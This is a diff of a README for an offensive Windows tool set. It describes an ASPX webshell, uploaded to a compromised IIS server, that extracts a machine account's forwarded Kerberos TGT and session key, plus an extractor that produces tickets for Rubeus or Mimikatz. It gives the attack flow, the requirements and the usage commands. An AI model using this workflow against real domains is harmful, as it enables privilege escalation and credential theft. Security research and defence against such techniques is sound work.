@@ -13,9 +13,9 @@ When a web application runs under an **IIS virtual account** (e.g. `IIS APPPOOL\
 ## Full Attack Flow
 
 ```
-1. Upload tgt-Potato.aspx to compromised IIS web root
+1. Upload tgt_delegation.aspx to compromised IIS web root
 
-2. Visit http://target/tgt-Potato.aspx
+2. Visit http://target/tgt_delegation..aspx
    └─ Copy AP-REQ (Base64)
    └─ Copy Session Key (Base64)
 
@@ -29,24 +29,24 @@ When a web application runs under an **IIS virtual account** (e.g. `IIS APPPOOL\
 
 ---
 
-## Part 1 — ASPX Webshell (`tgt-potato.aspx`)
+## Part 1: ASPX Webshell (`tgt_delegation.aspx`)
 
-### What It Does
+#### What It Does
 
 It is a single-file ASP.NET webshell that performs two oprations:
 
-**Step 1 — AP-REQ extraction via SSPI**
+**Step 1: AP-REQ extraction via SSPI**
 
 The page calls `AcquireCredentialsHandle` to obtain a Kerberos credential handle for the current process identity (the machine account), then calls `InitializeSecurityContext` with the `ISC_REQ_DELEGATE` flag set. This triggers Windows to build a GSS-API token containing a full Kerberos AP-REQ with a **forwarded KRBTGT embedded inside the authenticator**. The GSS token is captured from the output buffer and displayed as Base64.
 
-**Step 2 — Session key extraction via LSA**
+**Step 2: Session key extraction via LSA**
 
 The page connects to the Local Security Authority using `LsaConnectUntrusted`, looks up the Kerberos authentication package, then calls `LsaCallAuthenticationPackage` with `KerbRetrieveEncodedTicketMessage` to retrieve the session key for the service ticket from the Kerberos cache. The session key is required to decrypt the authenticator inside the AP-REQ in order to recover the forwarded TGT.
 
-### How It Works — Step by Step
+#### How It Works
 
 ```
-Browser visits tgt-potato.aspx
+Browser visits tgt_delegation.aspx
          ||
          \/
 ResolveTargetSpn()
@@ -72,28 +72,29 @@ LsaCallAuthenticationPackage(KerbRetrieveEncodedTicketMessage,
   └─ Outputs: Session Key (Base64) + Encryption Type
 ```
 
-### Output
+#### Output
 
-
+| Output | Description |
+|-----------|-------------|
 | **AP-REQ (Base64)** | GSS-API token containing the encrypted authenticator with the forwarded TGT inside |
 | **Session Key (Base64)** | AES256/AES128/RC4 session key needed to decrypt the authenticator |
 | **Encryption Type** | Etype used (e.g. AES256-CTS-HMAC-SHA1-96) |
 
-### Usage
+#### Usage
 
 Upload ASPX code to the comprommised IIS web application and visit it in a browser:
 
-![]()
+![](https://raw.githubusercontent.com/incredibleindishell/Certi-Bhai/refs/heads/main/IIS_Privilege_escalation/TGT_Delegation_Trick/aspx_code.png)
 
 ```
 # Auto-detect DC
-http://target/tgt-potato.aspx
+http://target/tgt_delegation.aspx
 
 # Specify DC short hostname (domain suffix auto-appended)
-http://target/tgt-potato.aspx?target=<DC_hostname>
+http://target/tgt_delegation.aspx?target=<DC_hostname>
 ```
 
-### Requirements
+#### Requirements
 
 - Web application must be running on a **domain-joined** machine
 - Target DC must have **unconstrained delegation** enabled (default for all DCs)
@@ -101,20 +102,21 @@ http://target/tgt-potato.aspx?target=<DC_hostname>
 
 ---
 
-## Part 2 — TGT Extractor (`TGTDelegation.exe`)
+## Part 2: TGT Extractor (`TGTDelegation.exe`)
 
-### What It Does
+#### What It Does
 
-`TGTDelegation.exe` is a standalone Windows console tool that takes the `AP-REQ` and session key output from `tgt-Potato.aspx` and extracts the **Machine Account KRBTGT** from it. The output a valid `.kirbi` (KRB-CRED format) importable directly into `Rubeus`, `Mimikatz`, or any Kerberos tool, or alternatively a MIT `.ccache` file for use with Linux-based tools.
+`TGTDelegation.exe` is a standalone Windows console tool that takes the `AP-REQ` and session key output from `tgt_delegation.aspx` and extracts the **Machine Account KRBTGT** from it. The output a valid `.kirbi` (KRB-CRED format) importable directly into `Rubeus`, `Mimikatz`, or any Kerberos tool, or alternatively a MIT `.ccache` file for use with Linux-based tools.
 
 Note: The decryption logic is also borrowed from the [Rubeus](https://github.com/GhostPack/Rubeus) tool.
 
-### Usage
+#### Usage
 
 ```
 TGTDelegation.exe /apreq:<base64> /session_key:<base64> [/output:base64|ccache]
 ```
 
+| Parameter | Description |
 |-----------|-------------|
 | `/apreq` | AP-REQ GSS token in Base64 (from `working.aspx`) |
 | `/session_key` | Session key in Base64 (from `working.aspx`) |
@@ -129,9 +131,9 @@ TGTDelegation.exe /apreq:YII... /session_key:NsD57FK...==
 # ccache output for Linux tools
 TGTDelegation.exe /apreq:YII... /session_key:NsD57FK...== /output:ccache
 ```
-![]()
+![](https://raw.githubusercontent.com/incredibleindishell/Certi-Bhai/refs/heads/main/IIS_Privilege_escalation/TGT_Delegation_Trick/TGT_extractor.png)
 
-### Using the Extracted TGT
+#### Using the Extracted TGT
 
 **Windows — import with Rubeus:**
 ```cmd
@@ -145,18 +147,16 @@ Requires .NET Framework 4.x. Must be compiled and run on a Windows machine (uses
 
 ---
 
-
----
-
 ## Credits 
 
-| TGT Delegation Trick |  [Discovered by Benjamin Delpy] (https://x.com/gentilkiwi/status/998219775485661184)  |
-| AP-REQ and Session key extraction technique | [Rubeus](https://github.com/GhostPack/Rubeus)  |
-| Kerberos decryption | [Rubeus](https://github.com/GhostPack/Rubeus)  |
+TGT Delegation Trick:  [Discovered by Benjamin Delpy](https://x.com/gentilkiwi/status/998219775485661184)  
 
-Thanks to:
+AP-REQ and Session key extraction technique: [Rubeus](https://github.com/GhostPack/Rubeus)  
+
+Kerberos decryption: [Rubeus](https://github.com/GhostPack/Rubeus)
+
+## Thanks to:
 
 My partners in crime: Karan Raheja and Manoj Chauhan
-Supporter: Dominic Chell
----
 
+Supporter: Dominic Chell
